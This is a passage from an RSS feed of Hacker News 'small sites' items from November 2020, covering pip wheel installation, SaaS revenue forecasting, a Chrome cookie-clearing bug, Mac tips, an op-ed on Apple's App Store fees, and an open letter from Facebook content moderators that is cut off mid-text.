<div><div><pre><span></span>py -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
</div>
<p>For the cases where wheels are not available, pip offers <a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> as a
convenience, to build wheels for all your requirements and dependencies.</p>
<p><a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> requires the <a href="https://pypi.org/project/wheel/">wheel package</a> to be installed, which provides the
“bdist_wheel” setuptools extension that it uses.</p>
<p>To build wheels for your requirements and all their dependencies to a local
directory:</p>
<div>
<p><label for="tab-set--6-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install wheel
python -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--6-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install wheel
py -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>And <em>then</em> to install those requirements just using your local directory of
wheels (and not from PyPI):</p>
<div>
<p><label for="tab-set--7-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install --no-index --find-links<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--7-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install --no-index --find-links<span>=</span>…</pre></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020">https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020</a></em></p>]]>
            </description>
            <link>https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145396</guid>
            <pubDate>Thu, 19 Nov 2020 02:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Run professionally built algo-traders in 5 mins with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25145239">thread link</a>) | @tjs8rj
<br/>
November 18, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of users’ algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145239</guid>
            <pubDate>Thu, 19 Nov 2020 01:38:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Revenue Forecasting]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25144283">thread link</a>) | @lhh
<br/>
November 18, 2020 | https://www.modeloptic.com/blog/saas-revenue-forecasting | <a href="https://web.archive.org/web/*/https://www.modeloptic.com/blog/saas-revenue-forecasting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- DESKTOP -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- MOBILE -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- DESKTOP -->
      

      <!-- MOBILE -->
      
      

      

      <div><p>
        There are many reasons you might want to create a financial forecast, most of which boil down to either 1) helping you manage the business and understand its dynamics better, or 2) telling the story of the company to others (whether the internal team, senior management, the board, investors, or prospective investors).
        </p><p>
        Here we’ll show you how to forecast revenue (and associated key metrics) for a subscription SaaS business.
        </p></div>

      <div><p>
        If you'd like to follow along in Excel, here's the file we'll be walking through (though you'll still be able to follow along without it):
        </p><a href="#" type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" rel="nofollow" onclick="download_file(event)">
          <p><i></i>Download the Example Model
          </p>
        </a>
      </div>



      

      <div><p>
        We’ll start first by forecasting our number of active subscribers. To do this, we forecast two key components: The number of new subscribers in a given month, and the number of canceled subscriptions (or “churn”).
        </p><p>
        To begin with a simple illustration, we’ll assume that we win 10 new subscribers per month. We’ll also assume that these subscriptions are cancellable any time, and that 10% of existing subscribers choose to cancel each month.
        </p><p>
        The beginning # of active subscribers in any period equals the ending number from the prior month. We refer to this method of forecasting as a “screw”.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-1.png"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-1.png" data-enlargeable=""></p><p>
              <span>
                A basic subscriber forecast.
              </span>
            </p>
        </div>
      </div>

      <p>
        As a quick aside, there are many other ways to go about forecasting churn, like analyzing cohort behavior over time, to potentially get to a more accurate projection. Our view is that it’s only worth getting into that level of detail once the company has reached a certain level of maturity, likely in the range of several thousand subscribers. Before then though, the simpler monthly churn rate is the approach we most often recommend because it’s easier to calculate, easier to forecast, and it prevents you from getting bogged down in unnecessary detail and drawing conclusions from too sparse of data.
        </p>

      

       <div>
        <!-- <br /><br /> --><p>
        So now we have a simple framework for forecasting our number of active subscribers for any period. Next we add in our assumption on revenue per month, and multiply that by our # of active subscribers to get total revenue per month.
        </p><p>
        We'll add in a calculation for ARR (Annual Recurring Revenue) here as well by simply multiplying monthly revenue by 12.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-2.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-2.png" data-enlargeable=""></p><p>
              <span>
                Monthly Subscription Revenue = [ Ending # of Active Subscribers ] * [ Avg Revenue / Subscriber ]
              </span>
            </p>
        </div>
      </div>

      <p>
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. 
        </p>

      

      <div>
        <!-- <br /><br />
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say that charge is $5k.
        <br /><br /> --><p>
        Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say we charge $5k. You can see that logic added in below, and we've also totaled up these two revenue lines (Subscription Revenue and Implementation Revenue) to get Total Revenue. 
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-3.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-3.png" data-enlargeable=""></p><p>
              <span>
                Note that our ARR calculation here does not include the new non-recurring services revenue.
              </span>
            </p>
        </div>
      </div>

      

      <div>
        <!-- <br /><br /> --><p>
        We could also get a bit more sophisticated about how we forecast our number of new customers each month instead of simply hard-coding our new customer count at 10 per month. Let’s say our primary customer acquisition method is converting visitors from our website. For any set of website visitors, some of them contact us to become a lead, and then some of those leads convert into paying customers.
        </p><p>
        For starting baseline assumptions, let's say we get 1,000 website visitors per month, 2% of those convert into leads, 20% of our leads convert into paying customers, and our marketing efforts drive an increase in website visitors by 1,000 per month.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-4.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-4.png" data-enlargeable=""></p><p>
              <span>
                A slightly more sophisticated sales funnel forecast.
              </span>
            </p>
        </div>
      </div>

      <!-- <div class="col-12 col-md-6 offset-md-3 blog-section-content">
        <br /><br />
        You could then go further to calculate direct costs to get to gross profit, calculate customer LTV, tie new website visitors to marketing spend and new customers to sales spend to calculate CAC, and so on, but we’ll save those steps for future articles.
      </div> -->

      <!-- <div class="col-12 col-md-6 offset-md-3 blog-section-header">
        <h2>Conclusion</h2>
      </div> -->

      

      <div>
        <!-- <br /><br /> --><p>
        We could then go further to calculate direct costs to get to gross profit, calculate customer LTV, tie new website visitors to marketing spend, and so on, but we’ll save those steps for future articles.
        </p><!-- <span style="font-style: italic;">
          Want to be more sophisticated about forecasting? We're the makers of <a href="/">Modeloptic</a>, a powerful and intuitive financial reporting & projections platform. I'd love to hear from you at <a href="mailto:luke.harris@modeloptic.com">luke.harris@modeloptic.com</a>.
        </span> -->
      </div>


      

      <p>
        <span>
          Want to be more sophisticated about your forecasting? We're the makers of <a href="https://www.modeloptic.com/">Modeloptic</a>, a powerful and intuitive financial reporting &amp; projections platform. We'd love to hear from you at <a href="mailto:contact@modeloptic.com">contact@modeloptic.com</a>.
        </span></p>

    </div></div>]]>
            </description>
            <link>https://www.modeloptic.com/blog/saas-revenue-forecasting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25144283</guid>
            <pubDate>Wed, 18 Nov 2020 23:48:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chrome ‘Bug’ Exempts Google Cookies from Data Privacy Settings]]>
            </title>
            <description>
<![CDATA[
Score 173 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25143814">thread link</a>) | @betaman0
<br/>
November 18, 2020 | https://hfet.org/chrome-bug-exempts-google-cookies-from-data-privacy-settings/ | <a href="https://web.archive.org/web/*/https://hfet.org/chrome-bug-exempts-google-cookies-from-data-privacy-settings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<main id="main" role="main">

		
<article id="post-342">

	<!-- .entry-header -->

	
		<figure>
			<img width="1080" height="540" src="https://hfet.org/wp-content/uploads/2020/11/pexels-deepanker-verma-1482061-1080x540.jpg" alt="" loading="lazy">		</figure>

		
	
<div>

	<h4>A programmer named <a href="https://lapcatsoftware.com/articles/chrome-google.html" target="_blank" rel="noopener noreferrer">Jeff Johnson</a> recently discovered that enabling the “Clear cookies and site data when you quit Chrome” meant Google Search and YouTube cookies were not deleted, and exempt from this rule.</h4>
<p>He found that the only way to include Google and YouTube cookies for clearing is to specifically add <code>google.com</code> and <code>youtube.com</code> to <em>sites that can never use cookies</em> – it is not made obvious to the user that Google’s own services are exempt from the cookie clearing rule by default. <em>(<a href="https://lapcatsoftware.com/articles/chrome-google.html" target="_blank" rel="noopener noreferrer">source</a>)</em></p>
<p>Furthermore, <a href="https://www.independent.co.uk/life-style/gadgets-and-tech/google-privacy-chrome-youtube-search-bug-b1180705.html" target="_blank" rel="noopener noreferrer"><em>The Independent</em></a> investigated this issue and found similar results.</p>
<p>Google was made aware of this issue, and a Google spokesperson issued the following statement:</p>
<blockquote><p>“We are aware of a bug in Chrome that is impacting how cookies are cleared on some first-party Google websites. We are investigating the issue, and plan to roll out a fix in the coming days.” (<a href="https://www.theregister.com/2020/10/19/google_cookie_wipe/" target="_blank" rel="noopener noreferrer">source</a>)<em><br>
</em></p></blockquote>
<hr>
<p><em><strong>Author’s Note:</strong> Google has a <a href="https://en.wikipedia.org/wiki/Privacy_concerns_regarding_Google" target="_blank" rel="noopener noreferrer">long history of privacy violations</a>, which is one of the primary reasons I recommend finding ways to become less reliant on their services. A good first step would be to replace Chrome with <a href="https://www.mozilla.org/en-US/firefox/new/?redirect_source=firefox-com" target="_blank" rel="noopener noreferrer">Firefox</a>, and from there, looking to replace Google Search with <a href="https://duckduckgo.com/" target="_blank" rel="noopener noreferrer">DuckDuckGo</a> or <a href="https://startpage.com/" target="_blank" rel="noopener noreferrer">Startpage</a>.</em></p>
<p><a href="https://hfet.org/feed/"><img src="https://hfet.org/wp-content/uploads/2020/11/rss_button_hfet-1.png" alt="" width="219" height="30"></a><a href="https://hfet.org/support/"><img src="https://hfet.org/wp-content/uploads/2020/11/support_button_hfet.png" alt="" width="165" height="30"></a></p>
    <div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img width="100" height="100" src="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg" alt="" loading="lazy" srcset="https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-150x150.jpg 150w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-300x300.jpg 300w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-20x20.jpg 20w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-36x36.jpg 36w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-48x48.jpg 48w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-24x24.jpg 24w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel-96x96.jpg 96w, https://hfet.org/wp-content/uploads/2020/11/karl-swanepoel.jpg 640w" sizes="(max-width: 100px) 100vw, 100px"></p><div><p>I’m an AI &amp; Robotics Student interested in FOSS, Tech Sustainability and Data Rights. I’m also the founder of Humans For Ethical Technology.</p></div></div>	
</div><!-- .entry-content -->


</article>

	</main><!-- #main -->

	


	</div></div>]]>
            </description>
            <link>https://hfet.org/chrome-bug-exempts-google-cookies-from-data-privacy-settings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25143814</guid>
            <pubDate>Wed, 18 Nov 2020 23:02:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Three Things You Didn't Know Could Be So Easy on Your Mac]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25143753">thread link</a>) | @frankbyte
<br/>
November 18, 2020 | https://blog.urtti.com/three-easy-things-mac | <a href="https://web.archive.org/web/*/https://blog.urtti.com/three-easy-things-mac">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605740094407/1UXB_EYe2.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Three is a small number that promises a short story. So, I'll dive right in.</p>
<h2 id="1-check-the-weather-anywhere-quickly-and-easily">1. Check the weather anywhere quickly and easily</h2>
<p>You don't even need an app for it! </p>
<p>I can't believe I didn't know this before today, but Spotlight actually has integrated weather support. So, simply:</p>
<ol>
<li>Cmd+Space to bring up Spotlight</li>
<li>Type in "weather New York" or wherever you are and enter to see expanded results.  </li>
</ol>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605739448782/xH4OndroD.png?auto=format&amp;q=60" alt="London, CA.png"></p>
<h2 id="2-capture-un-selectable-text-anywhere-on-your-display">2. Capture un-selectable text anywhere on your display</h2>
<p>With the free handy little app  <a target="_blank" href="https://apps.apple.com/us/app/owlocr-pdf-image-to-text/id1499181666">OwlOCR</a>, this daily need becomes a breeze. </p>
<ol>
<li>Press Cmd+F1 to start the area selection.</li>
<li>Select the area on-screen.</li>
<li>Near instantaneously the text is in your clipboard to paste into any app or purpose.</li>
</ol>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605739680393/DHQjWa6kt.gif?auto=format,compress&amp;gif-q=60" alt="Easiest_way_to_capture_ANY_text_on_your_Mac_screen-2.gif"></p>
<h2 id="3-change-display-resolutions-without-diving-into-the-settings">3. Change display resolutions without diving into the settings</h2>
<p> <a target="_blank" href="https://apps.apple.com/us/app/easyres/id688211836">EasyRes</a> is a free app that makes this super-easy from your menubar - toggling both the internal display and external displays.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605739899842/Qo2Xqn-FE.png?auto=format&amp;q=60" alt="1920 x 1200 (2x).png"></p>
<p>Hope these help, please share your daily productivity shortcuts in the comments! </p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.urtti.com/three-easy-things-mac</link>
            <guid isPermaLink="false">hacker-news-small-sites-25143753</guid>
            <pubDate>Wed, 18 Nov 2020 22:58:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple's 15% Deflection Tactic]]>
            </title>
            <description>
<![CDATA[
Score 584 | Comments 454 (<a href="https://news.ycombinator.com/item?id=25143303">thread link</a>) | @lux
<br/>
November 18, 2020 | https://www.johnluxford.com/blog/apples-15-percent-deflection-tactic/ | <a href="https://web.archive.org/web/*/https://www.johnluxford.com/blog/apples-15-percent-deflection-tactic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-server-rendered="true" id="app" data-v-8769139c=""><div data-v-8769139c=""><div data-v-8769139c=""><div data-v-8769139c=""><blockquote>
<p>This post is in response to <a href="https://www.apple.com/newsroom/2020/11/apple-announces-app-store-small-business-program/" target="_blank" rel="nofollow noopener noreferrer">Apple’s App Store Small Business Program announcement</a>.</p>
</blockquote>
<p>For decades, developers were able to create and distribute their software, whether free or for a fee, to anyone with a PC or laptop. There was no gatekeeper deciding who was in or out, and there was no requirement that they hand over a significant percentage of their revenue to the device maker.</p>
<p>Video game consoles were the obvious exception to this, with the claim that they were specialized devices and, therefore, closed ecosystems. But personal computing was open, and that was an important catalyst for innovation for a long time.</p>
<p>That changed with the introduction of Apple's app store on iOS. Developers had to be approved by Apple, and had to agree to use Apple as their sole payment processor, to the tune of $99/year and 30% of their revenue. For contrast, payment processors at the time were charging around 2.9% and $0.30/transaction. That's a massive difference in and of itself.</p>
<blockquote>
<p>The 30% number was based on what video game consoles were charging developers.</p>
</blockquote>
<h2 id="apples-original-rationale">Apple's original rationale</h2>
<p>Apple's argument for the iPhone being a closed ecosystem was that a phone is a specialized device because its primary function is to make phone calls, and that primary function must be protected against rogue software that may disrupt its ability to make those calls.</p>
<p>Apple's argument that the 30% fee was fair was that it takes manpower to review and approve apps to be listed on their store.</p>
<h2 id="ripples-into-other-app-stores">Ripples into other app stores</h2>
<p>The issue grew bigger as Google implemented similar requirements and fee structures on the Android app store, and pretty much every app store from Steam to Samsung Galaxy followed suit.</p>
<p>Now that Microsoft and Apple have introduced app stores on Windows and macOS, they plan to slowly erode our freedom on PCs too so that they can reap the same financial benefits on our labour on all computing platforms (save for open source operating systems like Linux). Apple has since added warning messages discouraging users not to install third party software that hasn't paid for Apple's signature of approval. These warnings are getting more and more alarming with each OS upgrade, causing users to fear installing third party software through other, traditional means.</p>
<p>This needs to be stopped now because device makers are making the case that future devices like VR and AR headsets are also specialized devices and so they too should be subject to the same closed ecosystem and payment processing restrictions, which is simply untrue.</p>
<p>If an AR device replaces your PC, it's a generalized computing device, plain and simple.</p>
<h2 id="phones-are-not-specialized-computing-devices">Phones are not specialized computing devices</h2>
<p>Making phone calls was the sole function of a telephone, but a mobile phone is a powerful computer that can perform a wide range of functions. The new iPhone 12 Pro has built-in Lidar, a total of 4 cameras, GPS, and many other features that extend far being making phone calls.</p>
<p>What was once a primary feature is now just one of thousands, and potentially one of its least important features as we have dozens or more options for voice, video, and text-based messaging available to us. Many young people would probably be just fine on an iPod Touch that doesn't make calls at all, and many probably wouldn't know the difference.</p>
<p>Phones are general computing devices, and as such, should not be maintained as closed ecosystems. This doesn't benefit users, many of whom are also developers themselves, because it limits our freedom on both sides of the equation. General computing platforms should be protected from such predatory practices by manufacturers through strong government regulations.</p>
<h2 id="the-fee-isnt-the-issue-the-requirement-to-pay-is">The fee isn't the issue, the requirement to pay is</h2>
<p>Tying your right distribute an app that you developed independently of the hardware maker to the requirement to use their payment processor is anti-competitive because it means that every developer benefits the hardware maker while the hardware maker provides little more than a gatekeeper function and a small amount of file storage for their release builds.</p>
<p>How can any indie developer hope to compete with the likes of Apple or Google or Microsoft when every sale they make gives 15% of their profits over to their competition? And if they make more than $1m, it goes back up to 30%. That's a huge disparity that serves to protect the interests of the hardware maker at the expense of businesses everywhere.</p>
<p>If there was a hard cost for Apple and others to review and approve apps, then that should be charged up-front and not as a percentage of profit. Developers should be free to choose the payment processing service that best serves their needs, whether that's Stripe or Paypal or Apple's built-in offering. Apple's payment processor should be chosen because it's better, not because you have no other choice.</p>
<h2 id="disproportionate-profits">Disproportionate profits</h2>
<p>Since the cost of the review process and hosting are the justification for the payment processing fees, a good way to tell if they're in line with each other is to look at Apple's profits on the app store. In 2019, Apple generated about <a href="https://www.cnbc.com/2020/01/07/apple-app-store-had-estimated-gross-sales-of-50-billion-in-2019.html" target="_blank" rel="nofollow noopener noreferrer">$50bn in sales on the iOS app store</a>, with their take being about <strong>$15bn in profit</strong>.</p>
<p>Does it really cost Apple anywhere close to $15bn/year to maintain the app store's review process and hosting infrastructure?</p>
<h2 id="this-makes-some-business-models-unfeasible">This makes some business models unfeasible</h2>
<p>Some business models, like establishing a marketplace for content creators to share their work with each other, become unfeasible when 15-30% off the top goes straight to the device maker. Many businesses operate with profit margins well under 30% or even 15%. Amazon is widely known for maintaining a 1% profit margin across their entire business as a strategic advantage to be able to undercut everyone else.</p>
<p>Other payment processors are essentially locked out of these ecosystems entirely, which is unfair and anti-competitive against them. I bet Stripe would love to be able to provide a better mobile payment option – their core business – without Apple being such a significant portion of the sale, thereby negating any benefit that Stripe on its own can differentiate itself with.</p>
<h2 id="this-is-not-just-a-problem-for-developers">This is not just a "problem for developers"</h2>
<p>I've seen many comments on sites like Hacker News and MacRumours that this isn't a problem users should care about and that developers should essentially stop whining or take their software elsewhere. But this also limits the choices users have, and it limits the types of apps they get to benefit from. This limitation won't be felt directly, because you don't feel the absence of something you never knew you could have. <em>You don't know what you don't know.</em></p>
<p>Stifling innovation isn't good for anyone, and as more and more people become software developers, this really just hurts the small guys. The indies who are more similar in size and need to average consumers than the likes of tech giants like Apple or Google. Indie developers need protection from monopolistic and anti-competitive practices from larger players in the market through strong government regulation, not a discount on their first $1m in sales.</p>
<h2 id="this-model-is-being-replicated-in-vr-and-ar">This model is being replicated in VR and AR</h2>
<p>It's no secret that I work in Virtual Reality. In fact, writing this gives me some anxiety because my company could be targeted and harmed for me saying things that don't benefit the VR headset makers. <em>But this needs to be said.</em> In fact, I'd say this is one of the most important fights in the software industry today because it will determine whether future platforms are open or closed.</p>
<p>VR headsets have already been set up to be <a href="https://searchsecurity.techtarget.com/definition/walled-garden" target="_blank" rel="nofollow noopener noreferrer">walled gardens</a>, and although Oculus has turned a blind eye for the time being to third party app stores like <a href="https://sidequestvr.com/" target="_blank" rel="nofollow noopener noreferrer">SideQuest</a>, they could still decide to cut it off at any point in the future with little or no recourse.</p>
<p>Whether third party app stores are the solution also remains to be seen, but gauging by how difficult device makers make it for average users to install them, and what little percentage market share they have on each respective platform, I'd say they don't go far enough to solve this problem.</p>
<p>The ability to easily <a href="https://en.wikipedia.org/wiki/Sideloading" target="_blank" rel="nofollow noopener noreferrer">sideload</a>, aka install software directly onto a device that you own and not through any given app store, is paramount to maintaining free access to today's as well as tomorrow's computing platforms. And we should have the ability to do so without navigating a maze of warnings discouraging the average user from doing so.</p>
<h2 id="pcs-will-become-headsets-which-are-general-computing-devices">PCs will become headsets, which are general computing devices</h2>
<p>Augmented Reality is still in its infancy and isn't a general computing platform yet, not because it's specialized but because the technology isn't of sufficient quality yet. But it's improving rapidly, and one day it will be good enough to overtake both PCs and phones as the dominant computing platform of the future.</p>
<p>When it does, it will be critical to indie developers everywhere that we maintain the same level of freedom on these future platforms that we enjoy today on PCs, and stop the current erosion of those freedoms by big tech companies. Failure to do so will close off all software that isn't blessed by device makers, which will further increase the financial divide between indie developers and the companies who will control the platforms of the future, whether that's Apple, Google, Microsoft, or Facebook. <em>We can't let that happen.</em></p>
<h2 id="whats-the-solution">What's the solution?</h2>
<p>The solution is simple and threefold:</p>
<ol>
<li>Mobile phones and headset-based computing devices should be classified as general computing platforms in the eyes of the law.</li>
<li>General computing platforms should have the legal requirement that developers can distribute their software however they see fit, so long as it doesn't harm users (malware, spyware, etc.).</li>
<li>Choice of payment processors should not be forced on developers in exchange for the ability to distribute software on any general computing platform.</li>
</ol>
<p>Only when the above rights have been won in the eyes of the law will our fight be over on this front, but there will always be other …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.johnluxford.com/blog/apples-15-percent-deflection-tactic/">https://www.johnluxford.com/blog/apples-15-percent-deflection-tactic/</a></em></p>]]>
            </description>
            <link>https://www.johnluxford.com/blog/apples-15-percent-deflection-tactic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25143303</guid>
            <pubDate>Wed, 18 Nov 2020 22:23:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Letter from Facebook Content Moderators]]>
            </title>
            <description>
<![CDATA[
Score 358 | Comments 202 (<a href="https://news.ycombinator.com/item?id=25142657">thread link</a>) | @ynac
<br/>
November 18, 2020 | https://www.foxglove.org.uk/news/open-letter-from-content-moderators-re-pandemic | <a href="https://web.archive.org/web/*/https://www.foxglove.org.uk/news/open-letter-from-content-moderators-re-pandemic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-layout-label="Post Body" data-type="item" data-updated-on="1605716470576" id="item-5fb548adc77fc917bd132369"><div><div><div data-block-type="2" id="block-5e3e902ee21503131a93"><div><p><em>Foxglove is supporting social media content moderators in their fights for fair treatment from the platforms they work for, and for safe working conditions during the pandemic. Here is the full text of an open letter which over 200 Facebook content moderators from across the world have just addressed to Facebook’s leaders:</em></p><p><strong>November 2020</strong></p><p><strong>Mark Zuckerberg <br>Sheryl Sandberg <br>Anne Heraty (CEO, CPL/Covalen) <br>Julie Sweet (CEO, Accenture) <p>Via email and posting on Facebook’s Workplace channels </p></strong></p><div><p><strong>Open letter from content moderators re: pandemic <br></strong><br>Dear Mr. Zuckerberg, Ms. Sandberg, Ms. Heraty, Ms. Sweet </p><p>We, the undersigned Facebook content moderators and Facebook employees, write to express our dismay at your decision to risk our lives—and the lives of our colleagues and loved ones—to maintain Facebook’s profits during the pandemic. </p></div><p>After months of allowing content moderators to work from home, faced with intense pressure to keep Facebook free of hate and disinformation, you have forced us back to the office. Moderators who secure a doctors’ note about a personal COVID risk have been excused from attending in person.[1] Moderators with vulnerable relatives, who might die were they to contract COVID from us, have not. </p><p>The pandemic has been good for Facebook. More than 3 billion people have now joined Facebook services, creating more demand for our work than ever.[2] Mr. Zuckerberg nearly doubled his fortune during the crisis.[3] He is now worth well over $100 billion. It has been good for Facebook’s contractors, too: CPL, one of the main European contractors, is due to be sold for €318m.[4] </p><p>Despite vast sums flowing to each of you as corporate executives, you have refused moderators hazard pay. A content moderator at Accenture’s office in Austin, Texas generally earns $18/hour[5]. </p><p>Before the pandemic, content moderation was easily Facebook’s most brutal job. We waded through violence and child abuse for hours on end. Moderators working on child abuse content had targets increased during the pandemic, with no additional support. </p><p>Now, on top of work that is psychologically toxic, holding onto the job means walking into a hot zone. In several offices, multiple COVID cases have occurred on the floor.[6] Workers have asked Facebook leadership, and the leadership of your outsourcing firms like Accenture and CPL, to take urgent steps to protect us and value our work. You refused. We are publishing this letter because we are left with no choice. </p><p>Stop Needlessly Risking Moderators’ Lives </p><p>It is important to explain that the reason you have chosen to risk our lives is that this year Facebook tried using ‘AI’ to moderate content—and failed.[7] </p><p>At the start of the pandemic, both full-time Facebook staff and content moderators worked from home. To cover the pressing need to moderate the masses of violence, hate, terrorism, child abuse, and other horrors that we fight for you every day, you sought to substitute our work with the work of a machine. </p><p>Without informing the public, Facebook undertook a massive live experiment in heavily automated content moderation. Management told moderators that we should no longer see certain varieties of toxic content coming up in the review tool from which we work— such as graphic violence or child abuse, for example. </p><p>The AI wasn’t up to the job. Important speech got swept into the maw of the Facebook filter—and risky content, like self-harm, stayed up. </p><p>The lesson is clear. Facebook’s algorithms are years away from achieving the necessary level of sophistication to moderate content automatically. They may never get there. </p><p>This raises a stark question. If our work is so core to Facebook’s business that you will ask us to risk our lives in the name of Facebook’s community—and profit—are we not, in fact, the heart of your company? </p><p>Without our work, Facebook is unusable. Its empire collapses. Your algorithms cannot spot satire. They cannot sift journalism from disinformation. They cannot respond quickly enough to self-harm or child abuse. We can. </p><p>Facebook needs us. It is time that you acknowledged this and valued our work. To sacrifice our health and safety for profit is immoral. </p><p>These are our demands. </p><p>1. Keep moderators and their families safe. At the moment, only individual content moderators with a doctors’ note indicating that they are high risk are excused from working in the office. Even this is not offered in some workplaces. Those who live with an at-risk person – who have, for example, a child with epilepsy – have been forced to come in. All content moderators who are high risk or who live with someone who is high risk for Covid should be permitted to work from home indefinitely. </p><p>2. Maximize at-home working. Work that can be done from home should continue to be done from home. You have previously said content moderation cannot be performed remotely for security reasons. If that is so, it is time to fundamentally change the way that the work is organized. There is a pervasive and needlessly secretive culture at Facebook. Some content, such as content that is criminal, may need to be moderated in Facebook offices. The rest should be done at home. </p><p>3. Offer hazard pay. If you want moderators to risk their lives to maintain ‘community’ and profit, you should pay. Moderators who are working in the office on high-risk material (eg, child abuse) should be paid hazard pay of 1.5x their usual wage. </p><p>4. End outsourcing. There is, if anything, more clamor than ever for aggressive content moderation at Facebook. This requires our work. Facebook should bring the content moderation workforce in house, giving us the same rights and benefits as full Facebook staff. </p><p>5. Offer real healthcare and psychiatric care. Facebook employees enjoy various benefits, including private health insurance and visits to psychiatrists. Content moderators, who bear the brunt of the mental health trauma associated with Facebook’s toxic content, are offered 45 minutes a week with a ‘wellness coach’. These ‘coaches’ are generally not psychologists or psychiatrists and are contractually forbidden from diagnosis or treatment. And they generally cannot build a relationship of trust with moderators, since workers know that Facebook management (and Accenture/CPL management) ask ‘coaches’ to reveal confidential details of counselling sessions. Moderators deserve at least as much mental and physical health support as full Facebook staff. </p><p>The current 